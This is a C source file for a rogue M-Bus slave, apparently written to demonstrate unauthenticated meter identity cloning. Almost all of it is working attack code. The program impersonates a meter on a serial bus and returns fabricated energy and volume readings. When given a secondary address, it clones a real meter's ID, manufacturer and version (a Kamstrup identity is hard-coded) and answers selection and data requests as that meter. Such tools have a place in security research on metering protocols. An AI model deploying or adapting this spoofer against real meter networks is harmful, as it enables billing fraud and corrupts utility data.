/*
 * mbus-rogue-slave.c
 *
 * vibed from thin air - use at own risk
 *
 * Rogue M-Bus slave for demonstrating unauthenticated meter identity cloning.
 * Responds to a configurable primary address with fabricated meter data.
 * Optionally clones a real meter's secondary address and hardware identity.
 *
 * Build:
 *   gcc mbus-rogue-slave.c -lmbus -lm -o mbus-rogue-slave
 *
 * Usage:
 *   ./mbus-rogue-slave <device> <primary_addr> [energy_kwh] [volume_liters] [secondary_addr_hex]
 *
 * Examples:
 *   ./mbus-rogue-slave /dev/ttyUSB0 99
 *   ./mbus-rogue-slave /dev/ttyUSB0 99 54321 111111 781802062D2C0F04
 *
 * Notes:
 *   - MBUS_OPTION_PURGE_FIRST_FRAME must be disabled (it is ON by default for
 *     master mode and will eat incoming frames in slave use)
 *   - Use mbus_serial_recv_frame, not mbus_recv_frame, to avoid master-mode
 *     assumptions in the high-level receive path
 *   - Frame start/stop bytes must be set explicitly in the frame struct
 *   - secondary_addr_hex must be in SELECT-frame wire format (not scan display
 *     format) — see PHASE2E_SUMMARY.md for the byte-order distinction
 *   - Link with -lm (libmbus uses pow())
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <mbus/mbus.h>

static volatile int running = 1;
static void handle_signal(int sig) { running = 0; }

/*
 * Build variable data payload. Pass cloned=1 to use Kamstrup identity,
 * cloned=0 for rogue "FAK" identity.
 */
static int build_variable_data(unsigned char *buf, size_t bufsize,
                                unsigned long energy_kwh,
                                unsigned long volume_liters,
                                int cloned,
                                unsigned char *clone_id,      /* 4 bytes BCD */
                                unsigned char *clone_mfr,     /* 2 bytes */
                                unsigned char clone_ver,
                                unsigned char clone_medium)
{
    int i = 0;
    if (cloned) {
        buf[i++]=clone_id[0]; buf[i++]=clone_id[1];
        buf[i++]=clone_id[2]; buf[i++]=clone_id[3];
        buf[i++]=clone_mfr[0]; buf[i++]=clone_mfr[1];
        buf[i++]=clone_ver;
        buf[i++]=clone_medium;
    } else {
        /* "FAK" rogue identity */
        buf[i++]=0x37; buf[i++]=0x13; buf[i++]=0x37; buf[i++]=0x13;
        buf[i++]=0x2B; buf[i++]=0x18;
        buf[i++]=0x01;
        buf[i++]=0x04;
    }
    buf[i++]=0x01;  /* access number */
    buf[i++]=0x00;  /* status */
    buf[i++]=0x00; buf[i++]=0x00;  /* signature */
    buf[i++]=0x04; buf[i++]=0x06;
    buf[i++]=(energy_kwh>> 0)&0xFF; buf[i++]=(energy_kwh>> 8)&0xFF;
    buf[i++]=(energy_kwh>>16)&0xFF; buf[i++]=(energy_kwh>>24)&0xFF;
    buf[i++]=0x04; buf[i++]=0x13;
    buf[i++]=(volume_liters>> 0)&0xFF; buf[i++]=(volume_liters>> 8)&0xFF;
    buf[i++]=(volume_liters>>16)&0xFF; buf[i++]=(volume_liters>>24)&0xFF;
    return i;
}

static void send_ack(mbus_handle *handle)
{
    mbus_frame f;
    memset(&f, 0, sizeof(f));
    f.type   = MBUS_FRAME_TYPE_ACK;
    f.start1 = MBUS_FRAME_ACK_START;
    mbus_serial_send_frame(handle, &f);
    usleep(50000);
}

static void send_rsp_ud(mbus_handle *handle, int resp_addr,
                         unsigned long energy, unsigned long volume,
                         int cloned,
                         unsigned char *clone_id, unsigned char *clone_mfr,
                         unsigned char clone_ver, unsigned char clone_medium)
{
    mbus_frame f;
    memset(&f, 0, sizeof(f));
    f.type                = MBUS_FRAME_TYPE_LONG;
    f.start1              = 0x68;
    f.start2              = 0x68;
    f.stop                = 0x16;
    f.control             = MBUS_CONTROL_MASK_RSP_UD;
    f.address             = (unsigned char)resp_addr;
    f.control_information = 0x72;
    f.data_size = build_variable_data(f.data, sizeof(f.data),
                                       energy, volume, cloned,
                                       clone_id, clone_mfr, clone_ver, clone_medium);
    mbus_serial_send_frame(handle, &f);
    usleep(200000);
}

/* Parse hex string "781802062D2C0F04" into 8 bytes */
static int parse_secondary_addr(const char *hex, unsigned char *out)
{
    if (strlen(hex) != 16) return -1;
    for (int i = 0; i < 8; i++) {
        char byte[3] = { hex[i*2], hex[i*2+1], 0 };
        out[i] = (unsigned char)strtol(byte, NULL, 16);
    }
    return 0;
}

/* Compare received frame data bytes to our secondary address.
 * 0xFF in the pattern is a wildcard (M-Bus standard). */
static int secondary_addr_match(unsigned char *frame_data, size_t data_size,
                                  unsigned char *our_addr)
{
    if (data_size < 8) return 0;
    for (int i = 0; i < 8; i++) {
        if (frame_data[i] != 0xFF && frame_data[i] != our_addr[i])
            return 0;
    }
    return 1;
}

static void usage(const char *prog)
{
    fprintf(stderr,
        "Usage: %s <device> <primary_addr> [energy_kwh] [volume_liters] [secondary_addr_hex]\n"
        "  secondary_addr_hex: 16-char hex e.g. 781802062D2C0F04 (enables identity cloning)\n",
        prog);
}

int main(int argc, char *argv[])
{
    if (argc < 3) { usage(argv[0]); return 1; }

    const char   *device  = argv[1];
    int           addr    = atoi(argv[2]);
    unsigned long energy  = (argc > 3) ? atol(argv[3]) : 12345;
    unsigned long volume  = (argc > 4) ? atol(argv[4]) : 98765;

    unsigned char secondary_addr[8];
    int has_secondary = 0;
    /* Identity to clone (from Kamstrup: ID=78180206, mfr=2D2C, ver=0F, medium=04) */
    unsigned char clone_id[4]  = {0x78, 0x18, 0x02, 0x06};
    unsigned char clone_mfr[2] = {0x2D, 0x2C};
    unsigned char clone_ver    = 0x0F;
    unsigned char clone_medium = 0x04;

    if (argc > 5) {
        if (parse_secondary_addr(argv[5], secondary_addr) != 0) {
            fprintf(stderr, "Bad secondary address (need 16 hex chars)\n");
            return 1;
        }
        has_secondary = 1;
        /* Use secondary addr bytes directly for clone identity fields */
        memcpy(clone_id,  secondary_addr + 0, 4);
        memcpy(clone_mfr, secondary_addr + 4, 2);
        clone_ver    = secondary_addr[6];
        clone_medium = secondary_addr[7];
        printf("[rogue-slave] Secondary address cloning: ");
        for (int i = 0; i < 8; i++) printf("%02X", secondary_addr[i]);
        printf("\n");
    }

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    mbus_handle *handle = mbus_context_serial(device);
    if (!handle) { fprintf(stderr, "context_serial failed\n"); return 1; }
    mbus_context_set_option(handle, MBUS_OPTION_PURGE_FIRST_FRAME, 0);
    if (mbus_connect(handle) != 0) { fprintf(stderr, "connect failed\n"); return 1; }
    if (mbus_serial_set_baudrate(handle, 2400) != 0) { fprintf(stderr, "baudrate failed\n"); return 1; }

    printf("[rogue-slave] %s primary=%d energy=%lu kWh volume=%lu L\n",
           device, addr, energy, volume);
    fflush(stdout);

    mbus_frame req;
    int polls = 0;
    int selected = 0;  /* 1 = we are currently secondary-selected */

    while (running) {
        memset(&req, 0, sizeof(req));
        int ret = mbus_serial_recv_frame(handle, &req);

        if (ret == MBUS_RECV_RESULT_TIMEOUT) continue;
        if (ret != MBUS_RECV_RESULT_OK) {
            if (running)
                fprintf(stderr, "[rogue-slave] recv err %d type=%d\n", ret, req.type);
            continue;
        }

        printf("[rogue-slave] rx: ctrl=0x%02X addr=0x%02X type=%d data_size=%zu\n",
               req.control, req.address, req.type, req.data_size);
        fflush(stdout);

        if (req.type == MBUS_FRAME_TYPE_ACK) continue;

        unsigned char ctrl = req.control & ~MBUS_CONTROL_MASK_FCB;

        /* --- Secondary address handling (addr 0xFD) --- */
        if (req.address == 0xFD) {
            if (ctrl == MBUS_CONTROL_MASK_SND_NKE) {
                /* Deselect: reset selection state, no response */
                if (selected) printf("[rogue-slave] Deselected (SND_NKE to 0xFD)\n");
                selected = 0;
                fflush(stdout);

            } else if (ctrl == MBUS_CONTROL_MASK_SND_UD &&
                       req.control_information == 0x52 &&
                       has_secondary)
            {
                /* Secondary SELECT frame: check if it matches our address */
                if (secondary_addr_match(req.data, req.data_size, secondary_addr)) {
                    printf("[rogue-slave] Secondary SELECT matched -> ACK, selected=1\n");
                    fflush(stdout);
                    selected = 1;
                    send_ack(handle);
                } else {
                    printf("[rogue-slave] Secondary SELECT did not match (not us)\n");
                    fflush(stdout);
                    selected = 0;
                }

            } else if (ctrl == MBUS_CONTROL_MASK_REQ_UD2 && selected) {
                /* Data request while secondary-selected: respond as cloned identity */
                polls++;
                printf("[rogue-slave] REQ_UD2 to 0xFD (secondary) poll#%d -> RSP_UD\n", polls);
                fflush(stdout);
                send_rsp_ud(handle, 0xFD, energy, volume,
                            has_secondary,
                            clone_id, clone_mfr, clone_ver, clone_medium);
            }
            continue;
        }

        /* --- Primary address handling --- */
        if (req.address != (unsigned char)addr && req.address != 0xFF)
            continue;

        if (ctrl == MBUS_CONTROL_MASK_SND_NKE) {
            printf("[rogue-slave] SND_NKE primary -> ACK\n"); fflush(stdout);
            send_ack(handle);

        } else if (ctrl == MBUS_CONTROL_MASK_REQ_UD2) {
            polls++;
            printf("[rogue-slave] REQ_UD2 primary poll#%d -> RSP_UD\n", polls); fflush(stdout);
            send_rsp_ud(handle, addr, energy, volume, 0, NULL, NULL, 0, 0);

        } else if (ctrl == MBUS_CONTROL_MASK_SND_UD) {
            printf("[rogue-slave] SND_UD primary -> ACK\n"); fflush(stdout);
            send_ack(handle);
        }
    }

    printf("[rogue-slave] done, %d polls served\n", polls);
    mbus_disconnect(handle);
    mbus_context_free(handle);
    return 0;
}
